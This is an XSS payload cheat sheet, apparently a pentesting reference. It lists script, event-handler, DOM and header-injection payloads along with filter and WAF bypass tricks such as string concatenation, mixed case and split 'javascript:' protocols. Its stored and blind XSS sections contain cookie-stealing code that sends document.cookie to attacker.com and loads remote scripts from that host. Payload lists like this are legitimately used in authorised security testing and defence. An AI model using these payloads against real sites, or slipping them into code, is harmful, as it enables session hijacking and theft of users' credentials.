## **Sample Payloads for Testing**
#### Basic Payloads
```
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
```

#### Attribute-Based Payloads
```
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onerror='alert(1)
"><img src=x onerror=alert(1)>
```

#### Tag Injection
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
```

#### Filter Bypass Payloads
```
<ScRiPt>alert(1)</sCrIpT>
<scr<script>ipt>alert(1)</scr</script>ipt>
%3Cscript%3Ealert(1)%3C/script%3E
&#60;script&#62;alert(1)&#60;/script&#62;
<svg><script>alert(1)</script></svg>
```

#### JavaScript Protocol
```
javascript:alert(1)
<a href="javascript:alert(1)">click</a>
```

#### Event Handler Payloads
```
<div onmouseover="alert(1)">hover</div>
<details open ontoggle="alert(1)">
<video><source onerror="alert(1)"></video>
<marquee onstart="alert(1)">test</marquee>
```

#### DOM-Based
```
#<script>alert(1)</script>
<svg onload=alert(123)>        //incase the output is rendering in <img>
?searchText=<script>alert(document.domain)</script>

//DOM XSS in innerHTML
element.innerHTML='...<img src=1 onerror=alert(123)>...'   

//DOM XSS in jQuery
?searchQuery=javascript:alert(document.cookie)
```

#### Classic Stored
```
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
<svg onload="navigator.sendBeacon('https://attacker.com',document.cookie)">
```

#### Session Hijack via Stored
```
<script>
  var i = new Image();
  i.src = "https://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
</script>
```

#### Blind XSS (Fires in admin panel / back-office, unknown context)
```
<script src="https://attacker.com/blind.js"></script>
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
"><script src=//attacker.com/x.js></script>
```

#### Encoded Variants
```
<script>alert(String.fromCharCode(88,83,83))</script>
\x3cscript\x3ealert(1)\x3c/script\x3e
<script>\u0061lert(1)</script>
```

#### React `dangerouslySetInnerHTML`
````
// If app uses dangerouslySetInnerHTML with unsanitized input
{ __html: '<img src=x onerror=alert(1)>' }
```
````

#### XSS via HTTP Headers (injected into reflected error pages - headers reflect in HTML page) 
``` 
X-Forwarded-For: <script>alert(1)</script> Referer: <svg onload=alert(1)> User-Agent: <img src=x onerror=alert(document.cookie)> 
```

### **Advanced Payloads**

#### String Concatenation / Keyword Obfuscation
```
<img src=x onerror=a='al';b='ert';window[a+b](document.domain)>
<svg onload=s=document;a='coo';b='kie';alert(s[a+b])>
<body onload=_='con';__='firm';self[_+__](document.domain)>
<h1 onmouseover=a="pro";b="mpt";top[a+b](1)>hover</h1>
```

#### Mixed Case Filter Bypass
```
<Img SrC=x OnErRoR=alert(1)>
<sVg/OnLoAd=confirm(document.domain)>
<INPUT TYPE="image" src=x oNeRrOr=alert(1)>
<DETAILS OPEN ONtOgGlE=alert(1)>
```

#### Context-Breaking Prefix + `javascript:` Protocol
```
//'"><a href="jav	ascript:alert(1)">click</a>
//'"><a href="jav&#x0A;ascript:confirm(1)">click</a>
//'"><a href="javascript:a='al';b='ert';window[a+b](1)">x</a>
"'>][<a href="javascript:void(prompt(document.domain))">test</a>
```

#### `globalThis` / `self` / `top` accessor Obfuscation
```
<svg onload=globalThis['al'+'ert'](document.domain)>
<img src=x onerror=self['al'+'ert'](1)>
<body onload=top['conf'+'irm'](document.domain)>
<iframe onload=frames['pro'+'mpt'](document.domain)>
```

#### Attribute Context Escape
```
" onmouseover=a='al';b='ert';window[a+b](1) x="
' onfocus=globalThis['al'+'ert'](document.domain) autofocus='
` onfocus=confirm(document.domain) autofocus=`
```

```
</h1></div></span><svg onload=alert(document.domain)>
</textarea></title><img src=x onerror=confirm(1)>
</script><img src=x onerror=alert(document.domain)>
</style></title><h1 onmouseover=prompt(document.domain)>x</h1>
```

## Key Techniques Summary

| Technique                   | Purpose                                                           |
| --------------------------- | ----------------------------------------------------------------- |
| `'al'+'ert'` string concat  | Bypass keyword/regex filters                                      |
| `globalThis[x]` / `self[x]` | Avoid direct `alert`/`confirm` references                         |
| Mixed case event handlers   | Bypass case-sensitive WAF rules                                   |
| `</tag>` prefix chains      | Escape current HTML render context                                |
| `jav\nascript:` split       | Bypass single-line `javascript:` pattern match                    |
| `//'">` prefix              | Escape JS string, single/double attribute, HTML simultaneously    |
| `document['do'+'main']`     | Confirm execution without triggering `document.domain` signatures |

## Source → Sink Cheatsheet for DOM XSS

|Source (Input)|Dangerous Sink|XSS Trigger|
|---|---|---|
|`location.search`|`innerHTML`|`?q=<img src=x onerror=alert(1)>`|
|`location.hash`|`document.write`|`#<script>alert(1)</script>`|
|`document.referrer`|`eval()`|Referrer with JS payload|
|`window.name`|`setTimeout(str)`|Set `window.name=alert(1)`|
|`postMessage` data|`innerHTML`|Post `<img src=x onerror=alert(1)>`|
|`localStorage` value|`document.write`|Store payload in localStorage|
|`URLSearchParams`|`element.src`|`javascript:alert(1)`|

## Quick Reference: Payload Selection by Context

|Context|Best Payload Type|
|---|---|
|HTML body|`<svg>`, `<img>`, `<script>` tags|
|HTML attribute|Event handler injection, quote escape|
|JS string|`';alert(1);//` , `\u0022` escapes|
|JS template literal|`` `${alert(1)}` ``|
|`href` / `src`|`javascript:` protocol|
|CSS context|`expression()`, `url(javascript:...)`|
|JSON response|`</script><svg onload=alert(1)>`|
|Admin/Blind panels|Exfil payloads + `<script src=>`|
